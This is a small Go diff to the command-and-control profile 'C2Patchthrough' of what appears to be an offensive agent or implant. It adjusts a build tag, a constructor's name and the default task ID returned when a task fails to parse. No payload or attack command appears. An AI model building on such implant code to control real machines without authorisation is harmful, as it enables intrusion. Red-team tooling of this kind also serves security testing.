@@ -1,4 +1,4 @@
-// +build patchthrough,linux darwin windows
+// +build restfulpatchthrough
 
 package profiles
 
@@ -49,7 +49,7 @@ type C2Patchthrough struct {
 	RsaPrivateKey  *rsa.PrivateKey
 }
 
-func (c C2Patchthrough) NewProfile() Profile {
+func newProfile() Profile {
 	return &C2Patchthrough{}
 }
 
@@ -203,7 +203,7 @@ func (c C2Patchthrough) GetTasking() interface{} {
 	task := structs.Task{}
 	err := json.Unmarshal(rawTask, &task)
 	if err != nil {
-		return structs.Task{Command: "none", Params: "", ID: "0"}
+		return structs.Task{Command: "none", Params: "", ID: ""}
 	}
 
 	return task
